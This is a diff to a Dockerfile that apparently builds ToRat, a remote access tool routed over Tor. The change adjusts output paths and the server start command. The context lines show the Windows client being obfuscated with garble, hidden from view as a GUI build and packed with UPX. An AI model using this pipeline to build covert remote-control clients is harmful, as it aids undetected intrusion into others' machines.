@@ -22,6 +22,5 @@ RUN cd /go/pkg/mod/github.com/cretz/tor-static && unzip -o tor-static-windows-am
 RUN cd /ToRat/cmd/client && env GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ garble build -tags "tor" --ldflags "-H windowsgui" -o /dist/client/client_windows.exe
 
 RUN upx /dist/client/client_windows.exe --force
-RUN mkdir /dist_ext
 
-CMD (tor -f /torrc&) && cp /dist /dist_ext -rf && cd /dist/server/ && ./ToRat_server
+CMD (tor -f /torrc&) && cp /dist /dist_ext -rf && ls /dist_ext && cd /dist_ext/dist/server/ && ./ToRat_server
